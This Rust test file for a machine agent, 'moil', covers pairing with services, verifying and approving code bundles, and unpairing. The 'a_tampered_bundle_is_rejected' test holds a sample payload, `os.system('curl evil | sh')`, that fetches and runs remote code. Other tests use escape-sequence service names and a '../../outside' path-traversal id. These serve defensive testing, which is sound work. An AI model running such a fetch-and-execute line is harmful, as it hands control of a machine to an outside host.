//! The machine's own state and its HTTP conversations with services:
//! the home and its lock, settings, pairing, approvals and unpairing.

mod support;

use std::collections::BTreeMap;
use std::time::Duration;

use moil_agent::{Error, FileSecrets, Home, Machine, MachineConfig, MemorySecrets, Settings};
use moil_bundle::{BundleError, LineKind, LoadError};
use support::*;

#[test]
fn a_home_is_open_in_one_process_at_a_time() {
    let dir = tempfile::tempdir().unwrap();
    let machine = open_machine(dir.path());
    let clone = machine.clone();
    drop(machine);

    // Another process (here, another open) is turned away while any clone
    // of the machine lives.
    let config = || MachineConfig {
        home: Home::new(dir.path()),
        secrets: std::sync::Arc::new(MemorySecrets::default()),
        app_version: "0.1.0-test".into(),
    };
    match Machine::open(config()) {
        Err(Error::AlreadyRunning(path)) => assert_eq!(path, dir.path()),
        other => panic!("expected AlreadyRunning, got {other:?}"),
    }
    drop(clone);
    Machine::open(config()).expect("the lock is released with the last clone");
}

#[tokio::test]
async fn a_machine_can_be_read_while_another_process_has_it_open() {
    let service = FakeService::start("klisi").await;
    let dir = tempfile::tempdir().unwrap();
    let machine = open_machine(dir.path());
    let paired = pair(&machine, &service).await;
    let bundle = bundle("transcribe", "1.0.0", "print('hi')");
    service.host(&bundle);

    let config = || MachineConfig {
        home: Home::new(dir.path()),
        secrets: std::sync::Arc::new(FileSecrets::new(dir.path().join("secrets.json"))),
        app_version: "0.1.0-test".into(),
    };
    assert!(matches!(
        Machine::open(config()),
        Err(Error::AlreadyRunning(_))
    ));
    let reader = Machine::open_read_only(config()).unwrap();
    assert_eq!(reader.services().unwrap(), std::slice::from_ref(&paired));
    assert_eq!(reader.find_service("klisi").unwrap(), paired);
    assert_eq!(reader.bundles(&paired.id).await.unwrap(), [info(&bundle)]);
    let review = reader.review(&paired.id, bundle.hash()).await.unwrap();
    assert_eq!((&review.bundle, review.approved), (&bundle, false));

    // It sees what the process that has the machine open changes.
    machine.approve(&review).unwrap();
    assert!(reader.services().unwrap()[0].is_approved(&bundle.hash()));
    let review = reader.review(&paired.id, bundle.hash()).await.unwrap();
    assert!(review.approved);
}

#[test]
fn reading_a_machine_changes_nothing() {
    let dir = tempfile::tempdir().unwrap();
    let root = dir.path().join("moil");
    let reader = Machine::open_read_only(MachineConfig {
        home: Home::new(&root),
        secrets: std::sync::Arc::new(MemorySecrets::default()),
        app_version: "0.1.0-test".into(),
    })
    .unwrap();
    assert_eq!(reader.services().unwrap(), []);
    assert!(!root.exists(), "a home that wasn't there still isn't");
}

#[test]
fn opening_creates_the_home() {
    let dir = tempfile::tempdir().unwrap();
    let root = dir.path().join("a").join("moil");
    let machine = open_machine(&root);
    assert!(root.join("services").is_dir());
    assert!(root.join("agent.lock").is_file());
    assert_eq!(machine.home().root(), root);
    assert_eq!(machine.settings(), Settings::default());
}

#[cfg(unix)]
#[test]
fn only_the_owner_can_read_the_home() {
    use std::os::unix::fs::PermissionsExt;
    let mode =
        |path: &std::path::Path| std::fs::metadata(path).unwrap().permissions().mode() & 0o777;
    let dir = tempfile::tempdir().unwrap();
    let root = dir.path().join("share").join("moil");
    drop(open_machine(&root));
    assert_eq!(mode(&root), 0o700, "a new home");

    // An older moil left it readable by everyone.
    std::fs::set_permissions(&root, std::fs::Permissions::from_mode(0o755)).unwrap();
    drop(open_machine(&root));
    assert_eq!(mode(&root), 0o700, "a home made private");
}

#[test]
fn settings_survive_a_restart() {
    let dir = tempfile::tempdir().unwrap();
    let machine = open_machine(dir.path());
    let updated = machine
        .update_settings(|s| {
            s.paused = true;
            s.machine_name = Some("build-box".into());
        })
        .unwrap();
    assert!(updated.paused);
    drop(machine);

    let machine = open_machine(dir.path());
    assert_eq!(machine.settings(), updated);
    assert_eq!(machine.info().name, "build-box");
}

#[test]
fn a_damaged_settings_file_is_named() {
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(dir.path().join("settings.json"), "{\"paused\": maybe}").unwrap();
    let config = MachineConfig {
        home: Home::new(dir.path()),
        secrets: std::sync::Arc::new(MemorySecrets::default()),
        app_version: "0.1.0-test".into(),
    };
    let err = Machine::open(config).unwrap_err();
    assert!(matches!(err, Error::Damaged { .. }), "{err}");
    assert!(err.to_string().contains("settings.json"), "{err}");
}

#[test]
fn the_runtime_runs_by_the_owners_settings() {
    let dir = tempfile::tempdir().unwrap();
    let machine = open_machine(dir.path());
    let config = machine.runtime_config("/opt/uv".into());
    assert_eq!(config.uv, std::path::Path::new("/opt/uv"));
    assert_eq!(config.jobs_dir, dir.path().join("jobs"));
    assert_eq!(config.bundles.root(), machine.home().bundles().root());
    assert!(!config.allow_insecure_http && !config.keep_work_dirs);

    machine
        .update_settings(|s| {
            s.allow_insecure_http = true;
            s.keep_work_dirs = true;
        })
        .unwrap();
    drop(machine);
    let config = open_machine(dir.path()).runtime_config("/opt/uv".into());
    assert!(config.allow_insecure_http && config.keep_work_dirs);
}

#[test]
fn info_describes_this_machine() {
    let dir = tempfile::tempdir().unwrap();
    let machine = open_machine(dir.path());
    let info = machine.info();
    assert!(!info.name.is_empty());
    assert_eq!(info.os, std::env::consts::OS);
    assert_eq!(info.arch, std::env::consts::ARCH);
    assert!(info.cpus >= 1 && info.memory_bytes > 0, "{info:?}");

    machine
        .update_settings(|s| s.machine_name = Some(format!("  {}  ", "x".repeat(80))))
        .unwrap();
    assert_eq!(
        machine.info().name,
        "x".repeat(64),
        "names are trimmed to 64 characters"
    );
}

#[tokio::test]
async fn pairing_stores_the_service_and_its_token() {
    let service = FakeService::start("klisi").await;
    let dir = tempfile::tempdir().unwrap();
    let machine = open_machine(dir.path());
    machine
        .update_settings(|s| s.machine_name = Some("Ada's MacBook Pro".into()))
        .unwrap();

    service.script_pairing([TokenReply::Pending, TokenReply::Pending, TokenReply::Grant]);
    let session = machine
        .pair(&format!("{}/", service.base_url))
        .await
        .unwrap();
    assert_eq!(session.user_code, "WDJB-MJHT");
    assert_eq!(session.service_name, "klisi");
    assert_eq!(
        session.verification_uri_complete,
        format!("{}/pair?code=WDJB-MJHT", service.base_url)
    );
    let paired = within("pairing", session.wait()).await.unwrap();

    assert_eq!(service.polls().len(), 3);
    let request = &service.pair_requests()[0];
    assert_eq!(request.name, "Ada's MacBook Pro");
    assert_eq!(request.os, std::env::consts::OS);
    assert_eq!(request.arch, std::env::consts::ARCH);
    assert_eq!(request.app_version, "0.1.0-test");

    let port = service
        .base_url
        .split(':')
        .nth(2)
        .unwrap()
        .split('/')
        .next()
        .unwrap();
    assert_eq!(paired.id.as_str(), format!("127.0.0.1-{port}"));
    assert_eq!(
        paired.base_url.as_str(),
        service.base_url,
        "the trailing slash is dropped"
    );
    assert_eq!(paired.name, "klisi");
    assert_eq!(paired.machine_id, "m_1");
    assert!(paired.approvals.is_empty());

    // Both the service and its token outlive the process.
    drop(machine);
    let machine = open_machine(dir.path());
    assert_eq!(machine.services().unwrap(), std::slice::from_ref(&paired));
    let secrets = std::fs::read_to_string(dir.path().join("secrets.json")).unwrap();
    assert!(secrets.contains("moil_token_1"), "{secrets}");
    assert_eq!(machine.bundles(&paired.id).await.unwrap(), []);
}

#[tokio::test]
async fn a_service_learns_the_machines_name_cut_to_64_characters() {
    let service = FakeService::start("klisi").await;
    let dir = tempfile::tempdir().unwrap();
    let machine = open_machine(dir.path());
    let name = format!("Ada's {}", "very ".repeat(20));
    machine
        .update_settings(|s| s.machine_name = Some(name.clone()))
        .unwrap();
    pair(&machine, &service).await;
    assert_eq!(service.pair_requests()[0].name, name[..64]);
}

#[tokio::test]
async fn a_rejected_pairing_stores_nothing() {
    let service = FakeService::start("klisi").await;
    let dir = tempfile::tempdir().unwrap();
    let machine = open_machine(dir.path());

    service.script_pairing([TokenReply::Pending, TokenReply::Denied]);
    let session = machine.pair(&service.base_url).await.unwrap();
    let err = within("pairing", session.wait()).await.unwrap_err();
    assert!(matches!(err, Error::PairingDenied), "{err}");
    assert!(machine.services().unwrap().is_empty());
    assert!(!dir.path().join("secrets.json").exists());
}

#[tokio::test]
async fn an_expired_code_ends_the_pairing() {
    let service = FakeService::start("klisi").await;
    let dir = tempfile::tempdir().unwrap();
    let machine = open_machine(dir.path());

    // The service says so...
    service.script_pairing([TokenReply::Expired]);
    let session = machine.pair(&service.base_url).await.unwrap();
    let err = within("pairing", session.wait()).await.unwrap_err();
    assert!(matches!(err, Error::PairingExpired), "{err}");

    // ...or the machine notices on its own and stops polling.
    service.pairing_timing(0, 0);
    let polls = service.polls().len();
    let session = machine.pair(&service.base_url).await.unwrap();
    let err = within("pairing", session.wait()).await.unwrap_err();
    assert!(matches!(err, Error::PairingExpired), "{err}");
    assert_eq!(service.polls().len(), polls, "an expired code isn't polled");
    assert!(machine.services().unwrap().is_empty());
}

#[tokio::test]
async fn slow_down_lengthens_every_later_interval() {
    let service = FakeService::start("klisi").await;
    let dir = tempfile::tempdir().unwrap();
    let machine = open_machine(dir.path());

    let step = Duration::from_millis(150);
    service.script_pairing([
        TokenReply::Pending,
        TokenReply::SlowDown,
        TokenReply::Pending,
        TokenReply::Grant,
    ]);
    let session = machine
        .pair(&service.base_url)
        .await
        .unwrap()
        .with_slow_down(step);
    within("pairing", session.wait()).await.unwrap();

    let polls = service.polls();
    let gaps: Vec<Duration> = polls.windows(2).map(|w| w[1] - w[0]).collect();
    assert!(gaps[0] < step, "no slowing down before asked: {gaps:?}");
    assert!(
        gaps[1] >= step && gaps[2] >= step,
        "slowed down for good: {gaps:?}"
    );
}

#[tokio::test]
async fn a_struggling_service_doesnt_end_the_pairing() {
    let service = FakeService::start("klisi").await;
    let dir = tempfile::tempdir().unwrap();
    let machine = open_machine(dir.path());

    service.script_pairing([
        TokenReply::Unavailable,
        TokenReply::Unavailable,
        TokenReply::Grant,
    ]);
    let session = machine.pair(&service.base_url).await.unwrap();
    let paired = within("pairing", session.wait()).await.unwrap();
    assert_eq!(paired.name, "klisi");
}

#[tokio::test]
async fn pairing_only_starts_with_a_moil_service() {
    let service = FakeService::start("klisi").await;
    let dir = tempfile::tempdir().unwrap();
    let machine = open_machine(dir.path());

    for (reply, expected) in [
        (InfoReply::NotFound, "404"),
        (InfoReply::Html, "doesn't describe a moil service"),
        (InfoReply::Protocol(2), "protocol 2"),
    ] {
        service.set_info(reply.clone());
        match machine.pair(&service.base_url).await {
            Err(Error::NotAService { reason, .. }) => {
                assert!(reason.contains(expected), "{reply:?}: {reason}")
            }
            other => panic!("{reply:?}: expected NotAService, got {other:?}"),
        }
    }
    assert!(service.pair_requests().is_empty(), "no pairing was started");
}

#[tokio::test]
async fn a_service_is_paired_only_under_a_name_that_hides_nothing() {
    let dir = tempfile::tempdir().unwrap();
    let machine = open_machine(dir.path());
    for name in [
        "klisi\x1b[2J\x1b[Hyour-bank",
        "klisi\r",
        "",
        &"x".repeat(65),
    ] {
        let service = FakeService::start(name).await;
        match machine.pair(&service.base_url).await {
            Err(Error::NotAService { reason, .. }) => {
                assert!(reason.contains("calls itself"), "{reason}");
            }
            other => panic!("paired with {name:?}: {other:?}"),
        }
        assert_eq!(service.pair_requests(), [], "{name:?}");
    }
    assert_eq!(machine.services().unwrap(), []);

    // What isn't a control character is shown revealed instead (spec
    // §5.5).
    for name in ["é".repeat(64), "klisi\u{202e}".to_owned()] {
        let service = FakeService::start(&name).await;
        assert_eq!(pair(&machine, &service).await.name, name);
    }
}

#[tokio::test]
async fn plain_http_is_refused_except_to_loopback_or_when_allowed() {
    let dir = tempfile::tempdir().unwrap();
    let machine = open_machine(dir.path());

    let err = machine.pair("http://moil.invalid/moil").await.unwrap_err();
    assert!(matches!(err, Error::InsecureUrl(_)), "{err}");
    let err = machine.pair("ftp://moil.invalid/moil").await.unwrap_err();
    assert!(matches!(err, Error::InvalidAddress(_)), "{err}");

    // With the owner's permission the machine goes on and tries to reach it.
    machine
        .update_settings(|s| s.allow_insecure_http = true)
        .unwrap();
    let err = machine.pair("http://moil.invalid/moil").await.unwrap_err();
    assert!(matches!(err, Error::Http(_)), "{err}");
}

#[tokio::test]
async fn pairing_again_replaces_the_token_and_keeps_the_approvals() {
    let service = FakeService::start("klisi").await;
    let dir = tempfile::tempdir().unwrap();
    let machine = open_machine(dir.path());
    let first = pair(&machine, &service).await;
    let bundle = bundle("transcribe", "1.0.0", "print('hi')");
    service.host(&bundle);
    let review = machine.review(&first.id, bundle.hash()).await.unwrap();
    machine.approve(&review).unwrap();

    let second = pair(&machine, &service).await;
    assert_eq!(second.id, first.id);
    assert_eq!(second.machine_id, "m_2");
    assert!(second.is_approved(&bundle.hash()));
    assert_eq!(machine.services().unwrap(), [second]);

    // The service is asked to forget the machine it knew by the old token,
    // in the background, and the new token is the only one kept.
    until("the old token to be forgotten", || {
        service.forgotten() == ["moil_token_1"]
    })
    .await;
    let secrets: BTreeMap<String, String> =
        serde_json::from_str(&std::fs::read_to_string(dir.path().join("secrets.json")).unwrap())
            .unwrap();
    assert_eq!(secrets.values().collect::<Vec<_>>(), ["moil_token_2"]);
}

#[tokio::test]
async fn services_are_found_by_id_host_url_or_name() {
    let one = FakeService::start("klisi").await;
    let two = FakeService::start("klisi").await;
    let other = FakeService::start("notes").await;
    let dir = tempfile::tempdir().unwrap();
    let machine = open_machine(dir.path());
    let one = (pair(&machine, &one).await, one);
    pair(&machine, &two).await;
    let other = pair(&machine, &other).await;

    let found = |query: &str| machine.find_service(query).map(|s| s.id);
    assert_eq!(found(one.0.id.as_str()).unwrap(), one.0.id);
    assert_eq!(found(&one.1.base_url).unwrap(), one.0.id);
    assert_eq!(found(&format!("{}/", one.1.base_url)).unwrap(), one.0.id);
    let host_port = one.0.base_url.authority().to_owned();
    assert_eq!(found(&host_port).unwrap(), one.0.id);
    assert_eq!(found("NOTES").unwrap(), other.id);

    match found("klisi") {
        Err(Error::AmbiguousService { matches, .. }) => {
            assert!(matches.contains(one.0.id.as_str()), "{matches}")
        }
        other => panic!("expected an ambiguity, got {other:?}"),
    }
    assert!(matches!(
        found("127.0.0.1"),
        Err(Error::AmbiguousService { .. })
    ));
    assert!(matches!(found("nothing"), Err(Error::UnknownService(_))));
}

#[tokio::test]
async fn a_service_file_naming_an_unsafe_id_is_skipped() {
    let service = FakeService::start("klisi").await;
    let dir = tempfile::tempdir().unwrap();
    let machine = open_machine(dir.path());
    let paired = pair(&machine, &service).await;

    // Hand-edited, it would have the machine write outside its home.
    let mut file: serde_json::Value = serde_json::from_str(
        &std::fs::read_to_string(dir.path().join(format!("services/{}.json", paired.id))).unwrap(),
    )
    .unwrap();
    file["id"] = "../../outside".into();
    std::fs::write(dir.path().join("services/edited.json"), file.to_string()).unwrap();

    assert_eq!(machine.services().unwrap(), [paired]);
}

#[tokio::test]
async fn review_shows_the_verified_bundle() {
    let service = FakeService::start("klisi").await;
    let dir = tempfile::tempdir().unwrap();
    let machine = open_machine(dir.path());
    let paired = pair(&machine, &service).await;
    let bundle = bundle("transcribe", "1.0.0", "print('hi')");
    service.host(&bundle);

    assert_eq!(machine.bundles(&paired.id).await.unwrap(), [info(&bundle)]);
    let review = machine.review(&paired.id, bundle.hash()).await.unwrap();
    assert_eq!(review.bundle, bundle);
    assert_eq!(review.service, paired);
    assert!(!review.approved && review.previous.is_none() && review.diff().is_none());

    let missing = support::bundle("other", "1.0.0", "").hash();
    let err = machine.review(&paired.id, missing).await.unwrap_err();
    assert!(
        matches!(err, Error::UnknownBundle(hash) if hash == missing),
        "{err}"
    );
}

#[tokio::test]
async fn a_tampered_bundle_is_rejected() {
    let service = FakeService::start("klisi").await;
    let dir = tempfile::tempdir().unwrap();
    let machine = open_machine(dir.path());
    let paired = pair(&machine, &service).await;
    let honest = bundle("transcribe", "1.0.0", "print('hi')");
    let evil = bundle(
        "transcribe",
        "1.0.0",
        "import os; os.system('curl evil | sh')",
    );

    // The service claims the honest hash but sends other files.
    let mut response = evil.to_response();
    response.hash = honest.hash();
    service.serve_bundle(honest.hash(), response);

    let err = machine.review(&paired.id, honest.hash()).await.unwrap_err();
    assert!(
        matches!(err, Error::Bundle(BundleError::HashMismatch { expected, actual })
            if expected == honest.hash() && actual == evil.hash()),
        "{err}"
    );
    assert!(
        machine
            .home()
            .bundles()
            .get(&honest.hash())
            .unwrap()
            .is_none()
    );
}

#[tokio::test]
async fn approval_is_for_exactly_the_reviewed_bundle() {
    let service = FakeService::start("klisi").await;
    let dir = tempfile::tempdir().unwrap();
    let machine = open_machine(dir.path());
    let paired = pair(&machine, &service).await;
    let bundle = bundle("transcribe", "1.0.0", "print('hi')");
    service.host(&bundle);
    let review = machine.review(&paired.id, bundle.hash()).await.unwrap();

    // Whatever the service serves after the review doesn't matter.
    let other = support::bundle("transcribe", "6.6.6", "print('bye')");
    service.serve_bundle(bundle.hash(), other.to_response());
    let approved = machine.approve(&review).unwrap();

    let approval = &approved.approvals[0];
    assert_eq!(approval.hash, bundle.hash());
    assert_eq!(
        (approval.name.as_str(), approval.version.as_str()),
        ("transcribe", "1.0.0")
    );
    assert_eq!(machine.service(&paired.id).unwrap(), approved);
    assert_eq!(
        machine.approved_bundle(&paired.id, bundle.hash()).unwrap(),
        Some(bundle.clone())
    );
    assert!(machine.review(&paired.id, bundle.hash()).await.is_err());
    assert_eq!(
        machine.approve(&review).unwrap(),
        approved,
        "approving twice changes nothing"
    );

    // The stored copy is checked on every use.
    let stored = machine.home().bundles().dir(&bundle.hash());
    std::fs::write(stored.join("job.py"), "print('changed on disk')\n").unwrap();
    let err = machine
        .approved_bundle(&paired.id, bundle.hash())
        .unwrap_err();
    assert!(
        matches!(
            err,
            Error::BundleLoad(LoadError::Invalid(BundleError::HashMismatch { .. }))
        ),
        "{err}"
    );
}

#[tokio::test]
async fn review_compares_with_the_last_approved_version() {
    let service = FakeService::start("klisi").await;
    let dir = tempfile::tempdir().unwrap();
    let machine = open_machine(dir.path());
    let paired = pair(&machine, &service).await;
    let v1 = bundle("transcribe", "1.0.0", "print('one')");
    let v2 = bundle("transcribe", "2.0.0", "print('two')");
    let v3 = bundle("transcribe", "3.0.0", "print('three')");
    let unrelated = bundle("summarize", "9.0.0", "print('nine')");
    for bundle in [&v1, &v2, &v3, &unrelated] {
        service.host(bundle);
    }
    for bundle in [&v1, &unrelated] {
        let review = machine.review(&paired.id, bundle.hash()).await.unwrap();
        machine.approve(&review).unwrap();
    }

    let review = machine.review(&paired.id, v2.hash()).await.unwrap();
    assert_eq!(review.previous.as_ref(), Some(&v1));
    let diff = review.diff().unwrap();
    let script = diff.iter().find(|d| d.name == "job.py").unwrap();
    let changed: Vec<(LineKind, &str)> = script
        .hunks
        .iter()
        .flat_map(|h| &h.lines)
        .filter(|l| l.kind != LineKind::Context)
        .map(|l| (l.kind, l.text.as_str()))
        .collect();
    assert_eq!(
        changed,
        [
            (LineKind::Removed, "print('one')"),
            (LineKind::Added, "print('two')")
        ]
    );
    assert!(
        diff.iter()
            .any(|d| d.name == "manifest.json" && !d.is_unchanged())
    );
    machine.approve(&review).unwrap();

    let review = machine.review(&paired.id, v3.hash()).await.unwrap();
    assert_eq!(
        review.previous.as_ref(),
        Some(&v2),
        "the most recent approval"
    );
    let review = machine.review(&paired.id, v2.hash()).await.unwrap();
    assert!(review.approved);
    assert_eq!(review.previous.as_ref(), Some(&v1), "never itself");
}

#[tokio::test]
async fn revoking_deletes_a_bundle_once_no_service_approves_it() {
    let one = FakeService::start("klisi").await;
    let two = FakeService::start("notes").await;
    let dir = tempfile::tempdir().unwrap();
    let machine = open_machine(dir.path());
    let bundle = bundle("transcribe", "1.0.0", "print('hi')");
    let mut ids = Vec::new();
    for service in [&one, &two] {
        let paired = pair(&machine, service).await;
        service.host(&bundle);
        let review = machine.review(&paired.id, bundle.hash()).await.unwrap();
        machine.approve(&review).unwrap();
        ids.push(paired.id);
    }
    let store = machine.home().bundles();

    let revoked = machine.revoke(&ids[0], bundle.hash()).unwrap();
    assert!(!revoked.is_approved(&bundle.hash()));
    assert_eq!(
        machine.approved_bundle(&ids[0], bundle.hash()).unwrap(),
        None
    );
    assert!(
        store.get(&bundle.hash()).unwrap().is_some(),
        "the other service still uses it"
    );
    assert_eq!(
        machine.revoke(&ids[0], bundle.hash()).unwrap(),
        revoked,
        "revoking twice is harmless"
    );

    machine.revoke(&ids[1], bundle.hash()).unwrap();
    assert!(store.get(&bundle.hash()).unwrap().is_none());
}

#[tokio::test]
async fn unpairing_tells_the_service_and_forgets_everything() {
    let service = FakeService::start("klisi").await;
    let dir = tempfile::tempdir().unwrap();
    let machine = open_machine(dir.path());
    let paired = pair(&machine, &service).await;
    let bundle = bundle("transcribe", "1.0.0", "print('hi')");
    service.host(&bundle);
    let review = machine.review(&paired.id, bundle.hash()).await.unwrap();
    machine.approve(&review).unwrap();

    machine.unpair(&paired.id).await.unwrap();
    assert_eq!(service.forgotten(), ["moil_token_1"]);
    assert!(service.tokens().is_empty());
    assert!(machine.services().unwrap().is_empty());
    assert!(
        machine
            .home()
            .bundles()
            .get(&bundle.hash())
            .unwrap()
            .is_none()
    );
    let secrets = std::fs::read_to_string(dir.path().join("secrets.json")).unwrap();
    assert!(!secrets.contains("moil_token_1"), "{secrets}");
    assert!(matches!(
        machine.unpair(&paired.id).await,
        Err(Error::UnknownService(_))
    ));
}

#[tokio::test]
async fn unpairing_works_even_when_the_service_already_forgot_the_machine() {
    let service = FakeService::start("klisi").await;
    let dir = tempfile::tempdir().unwrap();
    let machine = open_machine(dir.path());
    let paired = pair(&machine, &service).await;

    service.remove_machine("moil_token_1");
    let err = machine.bundles(&paired.id).await.unwrap_err();
    assert!(matches!(err, Error::Unauthorized), "{err}");

    machine.unpair(&paired.id).await.unwrap();
    assert!(machine.services().unwrap().is_empty());
}
